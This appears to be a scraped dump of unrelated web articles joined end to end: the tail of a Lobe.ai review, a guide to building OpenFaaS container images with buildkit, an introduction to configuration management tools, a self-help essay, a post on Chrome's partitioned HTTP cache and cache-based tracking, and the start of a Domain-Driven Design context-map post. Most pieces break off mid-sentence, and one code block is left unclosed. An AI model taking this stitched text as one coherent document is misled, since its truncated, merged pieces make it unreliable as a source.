Lobe, Google seemed to be a bit better but not by far. That being said the Google model took me 3 hours to train vs. minutes with Lobe.</p><h2>Future possibilities</h2><p>For me to see Lobe.ai can go in two different directions in the future. They can either go for making a bigger part of the pipeline and let you build small apps on top of the models or they can go for more types of models such as tabular models or text classification. Both directions could be pretty interesting and whatever direction they go for I’m looking forward to testing it out.</p><h2>Conclusion</h2><p>In conclusion Lobe.ai is a great step forward for accessible AI and already in it’s beta it’s very impressive and surely will be the first in a new niche of AI.&nbsp;</p><p>It doesn’t get easier than this and with the export functionality it’s actually a good candidate for many commercial products.</p><p>Make sure you test it out, even if it’s just for fun.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>In this post I'll outline several ways to build containers without the need for Docker itself. I'll use <a href="https://github.com/openfaas/">OpenFaaS</a> as the case-study, which uses OCI-format container images for its workloads. The easiest way to think about OpenFaaS is as a CaaS platform for <a href="https://kubernetes.io/">Kubernetes</a> which can run microservices, and add in FaaS and event-driven tooling for free.</p>
<p>See also <a href="https://openfaas.com/">OpenFaaS.com</a></p>
<p>The first option in the post will show how to use the built-in buildkit option for Docker's CLI, then <a href="https://github.com/moby/buildkit">buildkit</a> stand-alone (on Linux only), followed by Google's container builder, <a href="https://github.com/GoogleContainerTools/kaniko">Kaniko</a>.</p>
<blockquote>
<p>Note: this post covers tooling which can build an image from a Dockerfile, and so anything which limits the user to only Java or Go for instance is out of scope.</p>
</blockquote>
<p>I'll then wrap things up and let you know how to get in touch with suggestions, feedback and your own stories around wants and needs in container tooling.</p>
<h2 id="sowhatswrongwithdocker">So what's wrong with Docker?</h2>
<p>Nothing as such, Docker runs well on armhf, arm64, and on <code>x86_64</code>. The main Docker CLI has become a lot more than build/ship/run, and also lugs around several years of baggage, it now comes bundled with  Docker Swarm and EE features.</p>
<p>There are a few efforts that attempt to strip "docker" back to its component pieces, the original UX we all fell in love with:</p>
<ul>
<li>
<p><a href="https://github.com/docker/docker">Docker</a> - docker itself now uses containerd to run containers, and has support for enabling buildkit to do highly efficient, caching builds.</p>
</li>
<li>
<p><a href="https://podman.io/">Podman</a> and <a href="https://github.com/containers/buildah">buildah</a> combination - RedHat / IBM's effort, which uses their own OSS toolchain to generate OCI images. Podman is marketed as being daemonless and rootless, but still ends up having to mount overlay filesystems and use a UNIX socket.</p>
</li>
<li>
<p><a href="https://github.com/alibaba/pouch">pouch</a> - from Alibaba, pouch is billed as "An Efficient Enterprise-class Container Engine". It uses containerd just like Docker, and supports both container-level isolation with <a href="https://github.com/opencontainers/runc">runc</a> and "lightweight VMs" such as <a href="https://github.com/hyperhq/runv">runV</a>. There's also more of a <a href="https://github.com/alibaba/pouch/blob/master/docs/architecture.md">focus on image distribution and strong isolation</a>.</p>
</li>
<li>
<p>Stand-alone buildkit - buildkit was started by <a href="https://twitter.com/tonistiigi?lang=en">Tõnis Tiigi</a> from Docker Inc as a brand new container builder with caching and concurrency in mind. buildkit currently only runs as a daemon, but you will hear people claim otherwise. They are forking the daemon and then killing it after a build.</p>
</li>
<li>
<p><a href="https://github.com/genuinetools/img">img</a> - img was written by <a href="https://github.com/jessfraz">Jess Frazelle</a> and is often quoted in these sorts of guides and is a wrapper for buildkit. That said, I haven't seen traction with it compared to the other options mentioned. The project was quite active <a href="https://github.com/genuinetools/img/commits/master">until late 2018 and has only received a few patches since</a>. img claims to be daemonless, but it uses buildkit so is probably doing some trickery there. I hear that <code>img</code> gives a better UX than buildkit's own CLI <code>buildctr</code>, but it should also be noted that img is only released for <code>x86_64</code> and there are no binaries for armhf / arm64.</p>
</li>
</ul>
<blockquote>
<p>An alternative to <code>img</code> would be <code>k3c</code> which also includes a runtime component and plans to support ARM architectures.</p>
</blockquote>
<ul>
<li><a href="https://github.com/ibuildthecloud/k3c">k3c</a> - Rancher's latest experiment which uses containerd and buildkit to re-create the original, classic, vanilla, lite experience of the original Docker version.</li>
</ul>
<p>Out of all the options, I think that I like k3c the most, but it is very nascient and bundles everything into one binary which is likely to conflict with other software, at present it runs its own embedded containerd and buildkit binaries.</p>
<blockquote>
<p>Note: If you're a RedHat customer and paying for support, then you really should use their entire toolchain to get the best value for your money. I checked out some of the examples and saw one that used my "classic" blog post on multi-stage builds. See for yourself which style you prefer <a href="https://github.com/containers/buildah/blob/master/demos/buildah_multi_stage.sh">the buildah example</a> vs. <a href="https://blog.alexellis.io/mutli-stage-docker-builds">Dockerfile example</a>.</p>
</blockquote>
<p>So since we are focusing on the "build" piece here and want to look at relativelt stable options, I'm going to look at:</p>
<ul>
<li>buildkit in Docker,</li>
<li>buildkit stand-alone</li>
<li>and kaniko.</li>
</ul>
<p>All of the above and more are now possible since the OpenFaaS CLI can output a standard "build context" that any builder can work with.</p>
<h2 id="buildatestapp">Build a test app</h2>
<p>Let's start with a Golang HTTP middleware, this is a cross between a function and a microservice and shows off how versatile OpenFaaS can be.</p>
<pre><code>faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  build-test --prefix=alexellis2
</code></pre>
<ul>
<li><code>--lang</code> specifies the build template</li>
<li><code>build-test</code> is the name of the function</li>
<li><code>--prefix</code> is the Docker Hub username to use for pushing up our OCI image</li>
</ul>
<p>We'll get the following created:</p>
<pre><code>./
├── build-test
│   └── handler.go
└── build-test.yml

1 directory, 2 files
</code></pre>
<p>The handler looks like this, and is easy to modify. Additional dependencies can be added through vendoring or <a href="https://blog.golang.org/using-go-modules">Go modules</a>.</p>
<pre><code>package function

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func Handle(w http.ResponseWriter, r *http.Request) {
	var input []byte

	if r.Body != nil {
		defer r.Body.Close()

		body, _ := ioutil.ReadAll(r.Body)

		input = body
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(fmt.Sprintf("Hello world, input was: %s", string(input))))
}

<h3 id="buildthenormalway">Build the normal way</h3>
<p>The normal way to build this app would be:</p>
<pre><code>faas-cli build -f build-test.yml
</code></pre>
<p>A local cache of the template and Dockerfile is also available at <code>./template/golang-middleware/Dockerfile</code></p>
<p>There are three images that are pulled in for this template:</p>
<pre><code>FROM openfaas/of-watchdog:0.7.3 as watchdog
FROM golang:1.13-alpine3.11 as build
FROM alpine:3.11
</code></pre>
<p>With the traditional builder, each of the images will be pulled in sequentially.</p>
<p>The wait a few moments and you're done, we now have that image in our local library.</p>
<p>We can also push it up to a registry with <code>faas-cli push -f build-test.yml</code>.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/seq.png" alt="seq"></p>
<h3 id="buildwithbuildkitanddocker">Build with Buildkit and Docker</h3>
<p>This is the easiest change of all to make, and gives a fast build too.</p>
<pre><code>DOCKER_BUILDKIT=1 faas-cli build -f build-test.yml
</code></pre>
<p>We'll see that with this approach, the Docker daemon automatically switches out its builder for buildkit.</p>
<p>Buildkit offers a number of advantages:</p>
<ul>
<li>More sophisticated caching</li>
<li>Running later instructions first, when possible - i.e. downloading the "runtime" image, before the build in the "sdk" layer is even completed</li>
<li>Super fast when building a second time</li>
</ul>
<p>With buildkit, all of the base images can be pulled in to our local library at once, since the FROM (download) commands are not executed sequentially.</p>
<pre><code>FROM openfaas/of-watchdog:0.7.3 as watchdog
FROM golang:1.13-alpine3.11 as build
FROM alpine:3.11
</code></pre>
<p>This option works even on a Mac, since buildkit is proxied via the Docker daemon running in the VM.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/dkit.png" alt="dkit"></p>
<h3 id="buildwithbuildkitstandalone">Build with Buildkit standalone</h3>
<p>To build with Buildkit in a stand-alone setup we need to run buildkit separately on a Linux host, so we can't use a Mac.</p>
<p><code>faas-cli build</code> would normally execute or fork <code>docker</code>, because the command is just a wrapper. So to bypass this behaviour we should write out a build context, that's possible via the following command:</p>
<pre><code>faas-cli build -f build-test.yml --shrinkwrap

[0] &gt; Building build-test.
Clearing temporary build folder: ./build/build-test/
Preparing ./build-test/ ./build/build-test//function
Building: alexellis2/build-test:latest with golang-middleware template. Please wait..
build-test shrink-wrapped to ./build/build-test/
[0] &lt; Building build-test done in 0.00s.
[0] Worker done.

Total build time: 0.00
</code></pre>
<p>Our context is now available in the <code>./build/build-test/</code> folder with our function code and the template with its entrypoint and Dockerfile.</p>
<pre><code>./build/build-test/
├── Dockerfile
├── function
│   └── handler.go
├── go.mod
├── main.go
└── template.yml

1 directory, 5 files
</code></pre>
<p>Now we need to run buildkit, we can build from source, or grab upstream binaries.</p>
<pre><code>curl -sSLf https://github.com/moby/buildkit/releases/download/v0.6.3/buildkit-v0.6.3.linux-amd64.tar.gz | sudo tar -xz -C /usr/local/bin/ --strip-components=1
</code></pre>
<p>If you checkout the releases page, you'll also find buildkit available for armhf and arm64, which is great for multi-arch.</p>
<p>Run the buildkit daemon in a new window:</p>
<pre><code>sudo buildkitd 
WARN[0000] using host network as the default            
INFO[0000] found worker "l1ltft74h0ek1718gitwghjxy", labels=map[org.mobyproject.buildkit.worker.executor:oci org.mobyproject.buildkit.worker.hostname:nuc org.mobyproject.buildkit.worker.snapshotter:overlayfs], platforms=[linux/amd64 linux/386] 
WARN[0000] skipping containerd worker, as "/run/containerd/containerd.sock" does not exist 
INFO[0000] found 1 workers, default="l1ltft74h0ek1718gitwghjxy" 
WARN[0000] currently, only the default worker can be used. 
INFO[0000] running server on /run/buildkit/buildkitd.sock 
</code></pre>
<p>Now let's start a build, passing in the shrink-wrapped location as the build-context. The command we want is <code>buildctl</code>, buildctl is a client for the daemon and will configure how to build the image and what to do when it's done, such as exporting a tar, ignoring the build or pushing it to a registry.</p>
<pre><code>buildctl build --help
NAME:
   buildctl build - build

USAGE:
   
  To build and push an image using Dockerfile:
    $ buildctl build --frontend dockerfile.v0 --opt target=foo --opt build-arg:foo=bar --local context=. --local dockerfile=. --output type=image,name=docker.io/username/image,push=true
  

OPTIONS:
   --output value, -o value  Define exports for build result, e.g. --output type=image,name=docker.io/username/image,push=true
   --progress value          Set type of progress (auto, plain, tty). Use plain to show container output (default: "auto")
   --trace value             Path to trace file. Defaults to no tracing.
   --local value             Allow build access to the local directory
   --frontend value          Define frontend used for build
   --opt value               Define custom options for frontend, e.g. --opt target=foo --opt build-arg:foo=bar

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this article, you’ll learn the basics of Configuration Management tools so
that you can decide which one you need. Whether you’re looking to automate
your infrastructure management or are just browsing for future reference,
you’ll walk away with a handful of useful takeaways and insights.</p>
<p>We’ll start with what configuration management is and what it’s used for. Once
you understand its application, we’ll compare a few existing configuration
management tools and discuss their differences and overlapping features.</p>
<h2 id="what-is-configuration-management">What is Configuration Management?</h2>
<p><strong>Configuration Management (CM)</strong> is a systems engineering process that allows
you to configure your infrastructure and automate many tasks.</p>
<p>Traditionally, system administrators used to run scripts in batches to
configure new environments and keep them in the desired state. This intricate
process required manual documentation of every change, so human error was not
uncommon.</p>
<p>Then CM came into the picture. Think of it as an up-to-date inventory for all
of your assets, which include:</p>
<ul>
<li>Databases</li>
<li>Applications</li>
<li>Shared cache servers</li>
<li>A load balancer</li>
<li>Monitoring tools</li>
</ul>
<p>Now think about all of the config files on these servers (ini, xml, conf,
yaml). What about the packages, dependencies, and third-party libraries that
each server might require?</p>
<p>What if there was a tool that could aggregate all of that configuration, wrap
it around a central config file and always stay vigilant of any changes?</p>
<p>In the last decade, a plethora of configuration management tools hit the
software space. Tools like Ansible, Puppet, Salt, Chef, Terraform and many
more offer a wide range of capabilities to ease your infrastructure
development.</p>
<p>While they have many overlapping features, each software offers a unique set
of tools.</p>
<h2 id="why-is-configuration-management-important">Why is Configuration Management important?</h2>
<p>In the era of microservices, we shouldn’t configure each service manually:
it’s time-consuming and prone to human error. <strong>Configuration management
allows you to centralize and automate your infrastructure configuration.</strong></p>
<p>An average web application has at least one database, a shared cache server,
and a few web app instances. When scaling horizontally, it’s critical to be
able to change configuration quickly and revert in the case of disaster.</p>
<p>To minimize user impact, the architecture should be resilient and immune to
any outages.</p>
<p>CM enables you to tame your infrastructure, reduce operation costs and cut
downtime. Think of configuration management as an architectural framework of a
house - it provides a strong base for streamlined development.</p>
<h2 id="main-benefits-of-configuration-management">Main benefits of Configuration Management</h2>
<p><strong>Organization.</strong> Instead of piecing together scattered scripts, store your
configurations in a central location. This prevents firefighting and
unnecessary downtime. Controlling your entire infrastructure from one place
enables effective collaboration between teams. CM turns the most cumbersome
infrastructures into flexible architectures. It tracks changes, monitors
performance, and enforces consistency.</p>
<p><strong>Cost efficiency.</strong> Reduce the risk of security breaches by tracking
architectural changes. Cut costs by quickly scaling down when possible. CM
allows you to avoid wasteful duplication and eliminate redundant assets in
your cluster. Automating configuration can save you time and effort as your
architecture grows. Focus on infrastructure improvement, not maintenance.</p>
<p><strong>Rapid environment deployment.</strong> Repeatable configurations let you whip up a
sandbox cluster in a matter of minutes. Test new configuration updates and
roll them out in an incremental fashion without worrying about breaking
something.</p>
<p><strong>Stable infrastructure development.</strong> Infrastructure as Code (IaC) allows for
incremental and trackable updates to your infrastructure. Set up robust
environments with just a few lines of declarative code. Track your
infrastructure changes as part of the Software Development Life Cycle (SDLC)
to keep your system agile and your users happy.</p>
<p><strong>Hand a chunk of operations work to developers.</strong> By definition, development
seeks change while operations strives for stability. Even though DevOps merges
these two IT branches and helps to balance out their conflicting interests,
letting developers have control over their own architecture will only
streamline the overall development.</p>

<p>Now that we’ve discussed the software Configuration Management (CM) concept,
let’s clarify the idea of CM tools.</p>
<p>These are the tools that ensure consistency across the cluster of physical and
logical assets. Designed to automate the deployment, they facilitate
continuous integration and handle resource management across your
infrastructure.</p>
<p>Back in the day, manual configuration management was fraught with risks like
disruptions to application availability and data corruption. To alleviate
these, sysadmins strived to automate as many processes as possible by writing
scripts and executing them in batches. This is what led to the rise of
Configuration Management tools.</p>
<p>The first versions of major CM tools came out in the early 2000s. They mainly
relied on an imperative approach of running batch scripts to bring
environments to the desired state.</p>
<p>Within a decade, CM tools evolved into automation wizards and orchestration
maestros. Batch scripts have now been organized into a set of configuration
files that can spin up the entire environment with a simple keystroke.</p>

<p>The variety of CM tools can overwhelm even the most experienced sysadmin. To
pick the tool that’s right for you, consider the following:</p>
<p><strong>The community behind the technology.</strong> More established and mature
technologies seem to have a larger community of supporters. If you don’t plan
on buying enterprise support, this factor is essential - it might be your last
and the only line of defense when you run into problems. Although older
technologies might appear more mature and time-proven, they tend to be more
cumbersome.</p>
<p><strong>Purpose.</strong> How many existing systems will the CM tool need to configure and
integrate with? Will most of your environments serve operations or development
purposes? A system designed for operations staff will differ from one designed
for developers.</p>
<p><strong>Deployment frequency.</strong> Are you an agile development team that needs to ship
out changes several times a week? Or do you have more established applications
that require stability?</p>
<p><strong>User-friendly interface.</strong> Consider how comfortable your team members are
with Linux and the command line. Do they need a rich Graphical User Interface
or are they fine with a bare-bone terminal? What previous technologies have
they worked with?</p>
<p><strong>Organizational size.</strong> If your organization is large and has a complex
network of applications, choose a CM tool more conservatively. A mature,
widely-supported and highly secure product like Ansible would be the top
choice. It has a proven track record and a wide community of supporters.</p>
<p>There are many CM tools out there. However, as this is just an introduction to
configuration management, we’ll limit our choices to the few that stand out
the most (in our humble opinion).</p>

<p>Many CM tools have overlapping features, but each stands out in its own
special way. We’ll list the most prominent ones here to help you make the
right decision.</p>
<h3 id="ansible">Ansible</h3>
<p>With a market share of 27%, Red Hat’s <a href="https://www.ansible.com/" title="Red Hat's Ansible home page">Ansible</a> has the biggest community to
help you propel your development in times of architectural adversity. Being
the most versatile CM tool on the market, Ansible is trusted by Intel,
Atlassian, Cisco, Twitter, Verizon, and even NASA.</p>
<p>Best suited for automation, deployment and provisioning, this hefty CM tool
can handle the most complex IT workflows. Many benefits of Ansible make it the
top choice not only for large enterprises, but also for small organizations
and even startups.</p>
<p><strong>Agentless.</strong> Ansible’s push-based configuration approach leaves more
resources for your applications or simply allows you to remain lightweight.
The control node securely provisions all of its managed nodes or hosts through
SSH and doesn’t need to run any agents on remote servers. This makes it
convenient to add existing resources under configuration management.</p>
<p><strong>Readable syntax.</strong> Ansible’s Domain Specific Language is based on YAML and
is extended with templating ability. It lets you parameterize your playbooks
and keep sensitive data out of plain-text configuration until it hits its
final destination. The inventory file, which is used by Ansible as a map to
the infrastructure, can use a syntax similar to that of “ini”. However,
ini-style inventory is really only suitable for small scale deployments and
hello world demos. In all other use cases, we would probably use one either
YAML format or dynamic inventory.</p>
<p><strong>Wide selection of modules.</strong> When you install Ansible community edition, you
get access to over 4,000 modules that let you network with Windows and Linux
servers. If you ever need additional functionality, one of these modules most
likely offers it already.</p>
<p><strong>Reusability.</strong> Ansible can run your existing shell scripts so that you won’t
have to rewrite them. If you already have a semi-automated architecture,
Ansible can streamline your configuration management.</p>
<p><strong>Free.</strong> Ansible is an open-source and free software backed by a large
community. Many forums, stack overflow threads, and descriptive documentation
will always be within your reach should you run into any problems along your
configuration journey.</p>
<p>If you want to get up and running quickly while still ensuring consistency and
reliability, there is a big chance that Ansible could be your tool.</p>
<h3 id="puppet">Puppet</h3>
<p>Before Ansible hit the market a little less than a decade ago, <a href="https://puppet.com/" title="Puppet's home page">Puppet</a> was
the king of configuration management.</p>
<p>Unlike Ansible, Puppet takes a master-agent approach, requiring an agent on
every managed node. The master stores the code to define the desired state of
the entire infrastructure and delivers the individual configuration catalogs
to each agent. The node then brings itself to the desired state by applying
the configuration shipped from the master node.</p>
<p>It’s worth mentioning that …</p></div></div>

    </p>
    </figure>
        
        <p>I was raised in an impeccably positive household. I never heard anybody putting someone down. I never heard complaints about someone being more well-off or arguments about mistrust or misunderstanding. Smiling, complimenting, helping others and ultimately, having good intentions was a vital baseline for the <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">principles that I lived by</a>, growing up.</p>
<p>Despite this making up the foundations, who I am today isn’t defined by those past teachings. In my beginnings of adulthood, pernicious influences and dark natured experiences began to seep into a properly-maintained mental fortress. Like a tornado devastating the brickwork, <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">my truths and principles</a> were collapsing.</p>
<p>Following the disastrous events, I could not rebuild my conceptual fortitude with the same positive and frankly, innocent angle I once obtained. I found myself constructing <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">my worldview</a> with a new, darker outlook with hard-hitting truths that I explored brick, by brick…</p>
<h2>I. You can’t control the temperamental dispositions of those around you.</h2>
<blockquote>
<p>‘Treat others how you wish to be treated, and in turn, they will treat you the same.’</p>
</blockquote>
<p>If you’ve heard this line uttered, it’s probably due to an unexpected influence within history. Although your life may not have any direct bearing on religion, the story of Jesus inspired many, <em>indirectly</em>, to implement the nature of good-will. <em>‘What goes around, comes around’</em> is another phrase that stems from this same influence.</p>
<p>But this is simply not the case with humans. There are far too many variables that can take place in one life for you to be able to predict or even <em>expect</em>, good-will to ever be returned.</p>
<p>People are lazy. But understandably so. Our modern life demands us to be <a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">focused on the day-to-day</a> and unfortunately, ourselves. We are demanded to make something of/for ourselves and to protect it at all costs before <a href="https://journal.thriveglobal.com/5-skills-that-will-give-you-an-advantage-over-the-competition-51280b7deaac" rel="noopener noreferrer" target="_blank">it’s taken from us by the competition.</a> There is very little time to be fanatical about others when they spend such little time doing exactly that.</p>
<p>Nevertheless, there are outliers. There are individuals who <em>choose</em> to act on helping others, maintaining a positive and compassionate outlook and care for those around them._ These people should not be taken lightly. _They place effort in doing this, even if they believe that it comes to them effortlessly. They have subconsciously chosen to go against the common mindset and do what is in their power, to serve those that need it most: other humans.</p>
<p>Understanding this can give you the ability to spot these outliers, and can internally inspire yourself to behave in this way also. Acting without expectations, serving without demands and caring without want for the same can make way for an unstoppable character, filled with unlimited energy.</p>
<h2>II. You can be easily labelled by the majority.</h2>
<p>You: as an individual, actually have very little power in the ability to define your individuality. Labels and personality expectations are set by those who you do not know personally. As you mature, you start deciding your stance of certain beliefs and the position in which you choose to place yourself in society. But outside sources will categories these intricate and specific decisions and give others permission to believe they understand all of your perspective without having to query deeper.</p>
<p>In loss of hope, you will succumb to the majority and grant permission for the instant gratification of popular acceptance to take place. You will not truly feel yourself, but you will immediately feel like you belong. Deep down however, you know this doesn’t quite sit right. <a href="https://medium.com/@JustinCampbellP/a-small-moment-that-saved-a-relationship-453677ccc6ab" rel="noopener noreferrer" target="_blank">You desire close relationships</a> to talk through <a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">psychological obstacles</a> and inventive ideas; something you cannot get by conforming to group mentality.</p>
<p><a href="http://amzn.to/2fYgeMc" rel="noopener noreferrer" target="_blank">Marcus Aurelius</a> once said <em>‘The object of life is not to be on the side of the majority, but to escape finding oneself in the ranks of the insane.’</em> Be unique. Fight for your own right to be an individual and do not allow others to negatively undermine or label your own personal beliefs and life decisions. Its a long and hard battle, but the mental clarity and deep connections you will make with those who align with and <em>truly</em> understand you is worth every fight.</p>
<h2>III. People will try to gain power over you and manipulate you.</h2>
<p>A side-effect that comes from years of believing that the world is simply full of good intentions and <a href="https://medium.com/@JustinCampbellP/a-small-moment-that-saved-a-relationship-453677ccc6ab" rel="noopener noreferrer" target="_blank">compassionate people</a>, is being incredibly vulnerable to those who wish to harm you. You can misplace trust in those who aren’t to be trusted and you can become an addict to those who sound commanding. Learning about the truth of these characters can be a hard pill to swallow.</p>
<p>To many, power is a goal and an approach which they practice on countless situations. They seek to destroy your good intentions, look for your weaknesses and court to them to gain power over your decisions. However, these actions of manipulation can often be rationally understood. As <a href="http://amzn.to/2fXGczu" rel="noopener noreferrer" target="_blank">Niccolò Machiavelli</a> once put it: <em>‘Men are driven by two principal impulses, either by love or by fear.’</em> Many of those who seek to harm you, are inspired out of fear. Your display of content or confidence in approach to life can intimidate those who lack that similar attitude. The fear of losing stature or relationships through exposure of their ill-means drives them to, rather than improve themselves, control and put down those who display anything they lack.</p>
<p><a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">Know thy self. Know your weaknesses and let nothing move you.</a> You must master your own domain and be aware of where you can be targeted. Becoming comfortable with exposure is a masterful way of avoiding the control others seek to employ over you. You must seek solace in knowing yourself, <a href="https://journal.thriveglobal.com/5-skills-that-will-give-you-an-advantage-over-the-competition-51280b7deaac" rel="noopener noreferrer" target="_blank">pushing your abilities to their limits</a> and recognising that your flaws only allow your strengths to flourish.</p>
<h2>IV. You believe your own lies.</h2>
<p>The mind has an interesting control over itself. Convincing it that something was to be true, does not take much action. To lie, on several occasions, the same lie is one crippling way for you to invent a new truth for it to succumb to. Think of yourself rewriting over pages that had already been written and re-publishing that book; only to then destroy the original copy.</p>
<p>Although this is a foolish and often quite dangerous way to approach situations, this can actually be used to your own advantage. Horace once said <em>‘Rule your mind or it will rule you.’</em> Use this blinding technique to tell yourself the lie that <em>you’re better than you already are</em>. In doing so, you have already begun the path to believing the lie and living it. Your new life tied to this lie, will start to feel more desirable. Your decisions you make from then onward will serve this lie; which, in time, will transform into your new <em>truth</em>.</p>
<h2>V. There is no ‘one thing’ to improve.</h2>
<p>Self-improvement is an idealised approach that many people undergo. They seek shortcuts and hacks to evolve dramatically. Often they go looking for answers but look to external sources when doing so.</p>
<p>In your lifelong journey, you can be swayed by so-called ‘smarter’ people who have all the unlocks and keys to how you need to go about ‘succeeding’ in the world. Don’t be tempted by their apparent secrets. All the information you will ever need is out there. In the people you meet, and in the experiences you go about.</p>
<p>Reflection, self-awareness and a certain degree of persistent investigating is all you need. You must use all these constantly, with a high-level of self-discipline to win at your life. Notice the word I chose to use: ‘<em>your</em>’. This is your life and what success and improvement mean are chosen by you. It will be a long and uphill battle that you must fight with all your might; but fear not, the reward of unexpected, new ways of thinking and a pronounced contentment will make the fight — very much worth it.</p>
<h2>VI. You have an addictive nature.</h2>
<p>Humans are habitual creatures. You thrive off routine and your life spins on a cycle which you gracefully accept. These habits are inspired by simple actions, but they quickly lead to major behaviours which can impact your life decisions. If you allow yourself to taste one behaviour, your addictive nature can takeover, clouding both logic and reason.</p>
<p>There is no choice as to whether you can be addicted or not. _You have an addictive nature. _The only variable you have is <a href="https://medium.com/@JustinCampbellP/i-deleted-my-social-media-apps-heres-why-20f3807a6b38" rel="noopener noreferrer" target="_blank">choosing _what _you are addicted to.</a> Seek out behaviours and lifestyle choices that you feel will make you a better person and choose to become addicted to those things.</p>
<h2>VII. You are a very small person, in a very large world.</h2>
<p>This is a scary thought that you can never be free from. The world around you is almighty. Its overwhelming number of species, societies, cultures, decisions, land and open waters can be a beauty to marvel at; but can also be a powerfully belittling feeling.</p>
<p>You are small and insignificant in the broader aspect of nature. You choose to allow this to target your self-confidence and belonging in this world. You are free and as so, you have the right to explore this vast and incredible world. There is so much to see, hear, feel, taste and experience.</p>
<p><em>‘Belie your national defects.’ </em><a href="http://amzn.to/2yMKBc1" rel="noopener noreferrer" target="_blank">Baltasar Gracian</a> advises an unparalleled tactic. You must learn to become internationally fluid. Do not accept the norms of your given society and do not conform to the idea of blind patriotism if you have yet to see what else is out there. The old saying goes ‘<em>we fear most what we don’t understand</em>’. Well, place yourself in _culture shock and a_llow the world to teach you what it is that you don’t understand.</p>
<h2>VIII. You are alone.</h2>
<p>In your fight for freedom and true love for life, you must realise that you are alone in your fight. No one has any vested interest in doing everything for you, which is especially the case if you yourself are not investing all your energy in this battle. The dark fact is, even those closest to you can only do so much to help you, for everyone has their own demons in which they have to spend some time …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days.

		<div data-page-title="Diverge and converge to create a Context Map – Another look on tech" data-image="">

<section>

	<div>

		<p>Context Map was the first visualisation for the Bounded Context pattern from Domain-Driven Design. In a nutshell, it is a map of the different Bounded Contexts and their relationships. I tend to create a Context Map during or after a Big Picture EventStorming. Changing perspectives can be helpful, to challenge assumptions and get the best of different techniques.</p>

<p>However, sometimes it is hard to reach a consensus on the Context Map. I often operate in brownfield projects, with large organisations. Although people agree with the different bounded contexts, it is a process that takes time, and most significant energy. Which can lead to fatigue towards the method, and at the same time raises exciting patterns in the behaviours. But this blog post is not about emergent behaviour. :)</p>

<p>To tackle it, and inspired by the <a href="https://www.seanvantyne.com/2017/02/19/design-thinking-divergence-convergence-cycles/">Divergence and Convergence cycles</a> from Design Thinking, I start to apply the same pattern to my Context Mapping workshops. After a Big Picture EventStorming, I give the theory about Bounded Contexts and Context Mapping. You can find useful resources from the <a href="https://github.com/ddd-crew/context-mapping">DDD Crew</a>.</p>

